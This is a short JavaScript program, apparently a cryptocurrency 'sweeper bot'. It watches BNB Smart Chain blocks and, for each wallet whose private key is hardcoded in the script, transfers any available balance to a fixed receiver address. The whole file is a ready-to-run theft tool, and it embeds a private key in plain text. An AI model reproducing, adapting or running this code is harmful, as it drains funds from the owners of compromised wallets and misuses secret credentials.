const { EtherscanProvider } = require('@ethersproject/providers')
const { ethers } = require('ethers')
const { TransactionDescription, TransactionTypes } = require('ethers/lib/utils')

const provider = new ethers.providers.JsonRpcProvider("https://bscrpc.com")

const addressReceiver = '0x573dA5bDD17f2E0C07957733d8ef9Ba8D4Bb7a8c' 

const privateKeys = ["d75609f5824302f888d0b32cc4f7a4402eeb0c1d1f52abcc9fa624fd929896c5"]

const bot = async =>{
    provider.on('block', async () => {
        console.log('Waiting ;)');
        for (let i = 0; i < privateKeys.length; i++){
            const _target = new ethers.Wallet(privateKeys[i]);
            const target = _target.connect(provider);
            const balance = await provider.getBalance(target.address);
            const txBuffer = ethers.utils.parseEther("0.000105");
            if (balance.sub(txBuffer) > 0){
                console.log("New Account with BNB!");
                const amount = balance.sub(txBuffer);
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount,
                    });
                    console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
                } catch(e){
                    console.log(`error: ${e}`);
                }
            }
        }
    })
}
bot();
